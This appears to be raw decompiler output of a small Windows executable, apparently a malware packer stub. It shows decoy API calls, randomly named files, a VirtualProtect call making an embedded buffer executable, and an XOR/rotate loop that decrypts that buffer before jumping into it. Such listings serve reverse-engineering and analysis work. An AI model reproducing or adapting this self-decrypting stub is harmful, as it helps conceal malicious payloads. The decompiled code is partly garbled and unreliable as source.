/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

// int __usercall start@<eax>(_BYTE *@<ebx>, _BYTE *@<edi>);
_DWORD *__stdcall sub_4011FA(_DWORD *, unsigned int, int);
int __thiscall nullsub_1(_DWORD); // weak

//-------------------------------------------------------------------------
// Data declarations

char byte_401102[] = { '\x90' }; // weak
int dword_401238[8] =
{
  914749845,
  -2138504965,
  1292164193,
  358381525,
  -528216569,
  -1892136477,
  2132603817,
  -2068152395
}; // weak
// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern DWORD (__stdcall *SizeofResource)(HMODULE hModule, HRSRC hResInfo);
// extern UINT (__stdcall *GetACP)();
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern DWORD (__stdcall *GetFileType)(HANDLE hFile);
// extern UINT (__stdcall *GetOEMCP)();
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
CHAR ProcName[] = "ZwListenPort"; // idb
CHAR FileName[] = "xoZLzIV.EcV"; // idb
CHAR ModuleName[] = "NTDLL.DLL"; // idb
CHAR a98rmuscG4j[] = "98RmUsC.G4J"; // idb
CHAR aXflosbnytpf5cr[] = "XFloSBnYtPf5crshkvcy.otV"; // idb
CHAR aEb7yprxUxm[] = "eB7YPRX.uxM"; // idb


//----- (00401015) --------------------------------------------------------
int __usercall start@<eax>(_BYTE *a1@<ebx>, _BYTE *a2@<edi>)
{
  HANDLE FileA; // eax
  __int64 v4; // rax
  char v5; // ch
  double v6; // st7
  int v7; // ecx
  char v8; // tt
  unsigned __int16 v9; // dx
  int v10; // ecx
  int v11; // eax
  char v12; // cf
  bool v13; // pf
  char v14; // tt
  unsigned __int8 v15; // al
  double v16; // st7
  char *v18; // ebx
  char v21; // ch
  int v22; // ecx
  bool v23; // zf
  int v25; // ecx
  void *v27; // esp
  HRSRC hResInfo; // [esp+0h] [ebp-24h]
  HANDLE hObject; // [esp+4h] [ebp-20h]
  HANDLE hFile; // [esp+8h] [ebp-1Ch]
  int v31; // [esp+Ch] [ebp-18h]
  int v32; // [esp+Ch] [ebp-18h]
  LPSTR CommandLineA; // [esp+10h] [ebp-14h]
  DWORD flOldProtect; // [esp+14h] [ebp-10h] BYREF
  HMODULE hModule; // [esp+18h] [ebp-Ch]
  HANDLE v36; // [esp+1Ch] [ebp-8h]
  HANDLE v37; // [esp+20h] [ebp-4h]
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  hObject = CreateFileA(FileName, 0x80000000, 2u, 0, 3u, 0x124u, 0);
  if ( hObject == (HANDLE)-1 )
  {
    hModule = GetModuleHandleA(ModuleName);
    CommandLineA = GetCommandLineA();
    GetACP();
    GetACP();
    hResInfo = (HRSRC)GetProcAddress(hModule, ProcName);
    GetProcessHeap();
    SizeofResource(0, hResInfo);
    GetCurrentThreadId();
    GetFileType(hResInfo);
    FileA = CreateFileA(aXflosbnytpf5cr, 0x40000000u, 5u, 0, 3u, 0x26u, 0);
    v32 = ((int (__stdcall *)(_DWORD, _DWORD, HRSRC, int, HANDLE, int, LPSTR, DWORD, HMODULE, HANDLE, HANDLE, int))hResInfo)(
            0,
            0,
            hResInfo,
            -1,
            FileA,
            v31,
            CommandLineA,
            flOldProtect,
            hModule,
            v36,
            v37,
            savedregs);
    return ((int (*)(void))&byte_401102[v32 ^ 0xC0000005])();
  }
  else
  {
    GetFileSize(hModule, 0);
    GetOEMCP();
    v36 = CreateFileA(aEb7yprxUxm, 0xA0000000, 2u, 0, 3u, 0x1A6u, 0);
    GetProcessHeap();
    CloseHandle(hObject);
    VirtualProtect(dword_401238, 0xE454u, 0x40u, &flOldProtect);
    GetFileType(hFile);
    GetFileSize(hModule, 0);
    v37 = CreateFileA(a98rmuscG4j, 0x40000000u, 4u, 0, 3u, 0x181u, 0);
    ((_DWORD *(__stdcall *)(int *, unsigned int, int))((char *)sub_4011FA + v31 + 1073741819))(
      dword_401238,
      58452u,
      v31);
    LODWORD(v4) = GetProcessHeap();
    BYTE1(a1) ^= v5;
    LODWORD(v4) = v4 ^ 0x342010F7;
    __outdword(v4 % *(int *)v4, v4 / *(int *)v4);
    v6 = MEMORY[0xE984CD7F]();
    v8 = v12;
    v12 = __CFADD__(v12, *a1) | __CFADD__((_BYTE)v7, v12 + *a1);
    *a1 += v7 + v8;
    v10 = v7 - 1;
    LOBYTE(v11) = __inbyte(v9);
    v14 = v12;
    v12 = __CFADD__(v12, *(_BYTE *)(v11 - 2000768644)) | __CFADD__((_BYTE)v11, v12 + *(_BYTE *)(v11 - 2000768644));
    v13 = __SETP__(v11 + v14 + *(_BYTE *)(v11 - 2000768644), 0);
    *(_BYTE *)(v11 - 2000768644) += v11 + v14;
    v15 = __inbyte(0xBu);
    v16 = v6 - (double)*(int *)a1;
    if ( !v13 )
    {
      *(_BYTE *)(v10 + 1510081614) += v15 + v12;
      _AL = -29;
      v18 = a1 + 1;
      __asm { das }
      _RAX = MEMORY[0xF73ADDCC](-1180165474, v16);
      LODWORD(_RAX) = v12 + (_DWORD)_RAX - 1188097980;
      BYTE1(v22) = v21 - ((*a2 < (unsigned __int8)_RAX) + *(_BYTE *)(_RAX - 1706251591));
      LODWORD(_RAX) = _RAX ^ 0x155138F7;
      __asm { bound   edx, [eax] }
      LOBYTE(_RAX) = __inbyte(WORD2(_RAX));
      LOBYTE(_RAX) = _RAX & 0xF;
      v23 = (_BYTE)_RAX == 0;
      __asm { aaa }
      v25 = v22 - 1;
      if ( v23 )
      {
        if ( v25 )
          JUMPOUT(0x401284);
      }
      __asm { das }
      v27 = alloca((int)&savedregs);
      *v18 >>= v25;
      __asm { iret }
    }
    return nullsub_1(v10);
  }
}
// 4012B9: control flows out of bounds to 4012BA
// 4012B2: control flows out of bounds to 401284
// 4010E2: variable 'v31' is possibly undefined
// 40117D: variable 'hFile' is possibly undefined
// 40125B: variable 'v5' is possibly undefined
// 401262: variable 'v4' is possibly undefined
// 40126F: variable 'v12' is possibly undefined
// 40126F: variable 'v7' is possibly undefined
// 401272: variable 'v9' is possibly undefined
// 401273: variable 'v11' is possibly undefined
// 40129F: variable 'v21' is possibly undefined
// 4012B2: variable 'v22' is possibly undefined
// 401238: using guessed type int dword_401238[8];
// 4012EC: using guessed type int __thiscall nullsub_1(_DWORD);

//----- (004011FA) --------------------------------------------------------
_DWORD *__stdcall sub_4011FA(_DWORD *a1, unsigned int a2, int a3)
{
  _DWORD *result; // eax
  unsigned int v4; // edx

  result = a1;
  v4 = a2 >> 2;
  do
  {
    *result ^= a3;
    *result = __ROL4__(*result, 124);
    *result ^= 0x7E53849Fu;
    *result = __ROL4__(*result, 236);
    *result += 1309653416;
    *result -= 1569445592;
    *result ^= a3;
    *result += a3;
    *result++ -= a3;
    --v4;
  }
  while ( v4 );
  return result;
}

// nfuncs=3 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
